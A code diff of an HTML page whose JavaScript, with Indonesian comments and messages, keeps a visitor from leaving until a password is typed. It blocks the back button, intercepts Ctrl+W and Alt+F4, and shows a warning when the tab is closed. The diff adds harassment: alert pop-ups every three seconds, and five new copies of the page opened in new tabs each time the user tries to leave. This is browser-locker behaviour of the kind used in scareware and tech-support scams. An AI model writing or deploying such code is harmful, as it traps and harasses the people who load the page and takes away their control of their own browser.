@@ -27,7 +27,7 @@
     <button onclick="checkPassword()">Submit</button>
 
     <script>
-        let passwordEntered = false; // Status apakah password sudah dimasukkan
+        let passwordEntered = false;
 
         function checkPassword() {
             let password = document.getElementById("password").value;
@@ -35,50 +35,56 @@
                 passwordEntered = true;
                 alert("Password benar! Anda sekarang bisa keluar.");
             } else {
-                alert("Password salah! Anda tetap terjebak di sini.");
+                alert("Password salah! Coba lagi.");
             }
         }
 
-        // Cegah tombol kembali di browser
+        // Mencegah tombol kembali di browser
         function preventBackNavigation() {
             history.pushState(null, null, location.href);
             window.onpopstate = function () {
                 if (!passwordEntered) {
                     history.pushState(null, null, location.href);
-                    alert("Anda harus memasukkan password terlebih dahulu!");
+                    alert("Tidak bisa kembali sebelum memasukkan password!");
                 }
             };
         }
 
-        // Cegah user menutup tab atau keluar sebelum memasukkan password
+        // Mencegah user menutup tab
         window.onbeforeunload = function(event) {
             if (!passwordEntered) {
                 return "Anda harus memasukkan password terlebih dahulu sebelum keluar!";
             }
         };
 
-        // Deteksi dan cegah kombinasi tombol tertentu (CTRL+W, ALT+F4, dsb.)
+        // Mencegah shortcut close browser (CTRL+W, ALT+F4)
         document.addEventListener("keydown", function (event) {
             if (!passwordEntered) {
-                if (event.ctrlKey && event.key === "w") { // Cegah CTRL+W
-                    event.preventDefault();
-                    alert("Tidak bisa menutup tab sebelum memasukkan password!");
-                }
-                if (event.altKey && event.key === "F4") { // Cegah ALT+F4
+                if ((event.ctrlKey && event.key === "w") || (event.altKey && event.key === "F4")) {
                     event.preventDefault();
                     alert("Tidak bisa keluar sebelum memasukkan password!");
                 }
             }
         });
 
-        // Spam pop-up kalau user coba keluar paksa
+        // SPAM alert kalau user coba nutup browser
         setInterval(function () {
             if (!passwordEntered) {
                 alert("Masukkan password dulu kalau mau keluar!");
             }
-        }, 5000); // Setiap 5 detik pop-up muncul
+        }, 3000); // Muncul tiap 3 detik
+
+        // SPAM buka tab baru kalau user coba keluar
+        window.onbeforeunload = function(event) {
+            if (!passwordEntered) {
+                for (let i = 0; i < 5; i++) {
+                    window.open(location.href, "_blank");
+                }
+                return "Anda harus memasukkan password terlebih dahulu sebelum keluar!";
+            }
+        };
 
         preventBackNavigation();
     </script>
 </body>
-</html> 
+</html>
